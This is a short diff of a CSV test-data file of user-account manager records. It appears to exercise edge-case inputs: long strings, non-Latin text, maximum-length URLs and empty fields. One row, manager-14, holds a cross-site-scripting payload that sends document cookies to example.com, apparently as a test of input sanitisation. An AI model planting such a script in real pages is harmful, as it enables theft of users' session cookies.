@@ -13,5 +13,5 @@ manager-11,Degree 1,Overview 1,a,https://link1.com,user-account-manager-11
 manager-12,Degree 1,Overview 1,"Certification 1, Certification 2, Certification 3, Certification 4, Certification 5, Certification 6",https://link1.com,user-account-manager-12
 manager-13,Degree 1,Overview 1,貸んい建濯よ芝弾テソ,https://link1.com,user-account-manager-13
 manager-14,Degree 1,Overview 1,<script> window.location = ‘https://example.com/?user_data=’ + document.cookies; </script>,https://link1.com,user-account-manager-14
-manager-15,Degree 1,Overview 1,Certification 1,null,user-account-manager-15
+manager-15,Degree 1,Overview 1,Certification 1,,user-account-manager-15
 manager-16,Degree 1,Overview 1,Certification 1,https://fillerURL.com/255characters/maxLength/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,user-account-manager-16
